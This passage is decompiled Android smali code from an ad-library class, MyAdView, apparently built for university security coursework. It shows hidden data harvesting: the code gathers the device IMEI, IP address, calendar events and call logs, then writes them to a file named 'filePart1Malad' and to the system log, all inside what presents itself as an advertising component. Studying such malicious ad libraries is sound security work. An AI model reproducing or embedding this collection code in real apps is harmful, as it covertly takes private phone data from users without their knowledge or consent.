    invoke-static {v6, v5}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 94
    invoke-static {v0, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 95
    const-string v6, "IMEI: "

    invoke-static {v6, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 99
    new-instance v6, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView$1;

    invoke-direct {v6}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView$1;-><init>()V

    invoke-static {v6}, Landroid/os/AsyncTask;->execute(Ljava/lang/Runnable;)V

    .line 127
    invoke-static {}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->getIpAddress()Ljava/lang/String;

    move-result-object v6

    .line 128
    .local v6, "ipAddress":Ljava/lang/String;
    sget-object v7, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    const-string v8, "************************ IP ADDRESS ************************"

    invoke-static {v7, v8}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 129
    sget-object v7, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    invoke-static {v7, v6}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 130
    const-string v7, "************************ IP Address ************************"

    invoke-static {v0, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 131
    const-string v7, "IP ADDRESS: "

    invoke-static {v7, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 134
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v7

    .line 135
    .local v7, "c_start":Ljava/util/Calendar;
    const/16 v9, 0x7e4

    const/16 v10, 0xa

    const/4 v11, 0x1

    const/4 v12, 0x0

    const/4 v13, 0x0

    move-object v8, v7

    invoke-virtual/range {v8 .. v13}, Ljava/util/Calendar;->set(IIIII)V

    .line 136
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v8

    .line 137
    .local v8, "c_end":Ljava/util/Calendar;
    const/16 v15, 0x7e5

    const/16 v16, 0x1

    const/16 v17, 0x1

    const/16 v18, 0x0

    const/16 v19, 0x0

    move-object v14, v8

    invoke-virtual/range {v14 .. v19}, Ljava/util/Calendar;->set(IIIII)V

    .line 139
    invoke-static {v7, v8}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->getCalendar(Ljava/util/Calendar;Ljava/util/Calendar;)Ljava/lang/String;

    move-result-object v9

    .line 140
    .local v9, "calendar":Ljava/lang/String;
    sget-object v10, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    const-string v11, "************************ CALENDAR EVENTS ************************"

    invoke-static {v10, v11}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 141
    sget-object v10, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    invoke-static {v10, v9}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 142
    invoke-static {v0, v11}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 143
    const-string v10, "CALENDAR EVENTS: "

    invoke-static {v10, v9}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 146
    invoke-static {}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->getCallLog()Ljava/lang/String;

    move-result-object v10

    .line 147
    .local v10, "callLogs":Ljava/lang/String;
    sget-object v11, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    const-string v12, "\n************************ CALL LOGS ************************"

    invoke-static {v11, v12}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 148
    sget-object v11, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    invoke-static {v11, v10}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 149
    const-string v11, "************************ CALL LOGS ************************"

    invoke-static {v0, v11}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 150
    const-string v0, "CALL LOGS: "

    invoke-static {v0, v10}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 151
    return-void
.end method

.method public static writeToFile(Ljava/io/File;Ljava/lang/String;)V
    .locals 4
    .param p0, "file"    # Ljava/io/File;
    .param p1, "data"    # Ljava/lang/String;

    .line 266
    const/4 v0, 0x0

    .line 268
    .local v0, "f":Ljava/io/FileOutputStream;
    :try_start_0
    new-instance v1, Ljava/io/FileOutputStream;

    const/4 v2, 0x1

    invoke-direct {v1, p0, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, v1

    .line 271
    goto :goto_0

    .line 269
    :catch_0
    move-exception v1

    .line 270
    .local v1, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v1}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 272
    .end local v1    # "e":Ljava/io/FileNotFoundException;
    :goto_0
    new-instance v1, Ljava/io/PrintWriter;

    invoke-direct {v1, v0}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;)V

    .line 273
    .local v1, "pw":Ljava/io/PrintWriter;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    .line 274
    invoke-virtual {v1}, Ljava/io/PrintWriter;->flush()V

    .line 275
    invoke-virtual {v1}, Ljava/io/PrintWriter;->close()V

    .line 277
    if-eqz v0, :cond_0

    .line 278
    :try_start_1
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    .line 281
    goto :goto_2

    .line 279
    :catch_1
    move-exception v2

    goto :goto_1

    .line 277
    :cond_0
    new-instance v2, Ljava/lang/AssertionError;

    invoke-direct {v2}, Ljava/lang/AssertionError;-><init>()V

    .end local v0    # "f":Ljava/io/FileOutputStream;
    .end local v1    # "pw":Ljava/io/PrintWriter;
    .end local p0    # "file":Ljava/io/File;
    .end local p1    # "data":Ljava/lang/String;
    throw v2
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 280
    .restart local v0    # "f":Ljava/io/FileOutputStream;
    .restart local v1    # "pw":Ljava/io/PrintWriter;
    .local v2, "e":Ljava/io/IOException;
    .restart local p0    # "file":Ljava/io/File;
    .restart local p1    # "data":Ljava/lang/String;
    :goto_1
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    .line 282
    .end local v2    # "e":Ljava/io/IOException;
    :goto_2
    return-void
.end method
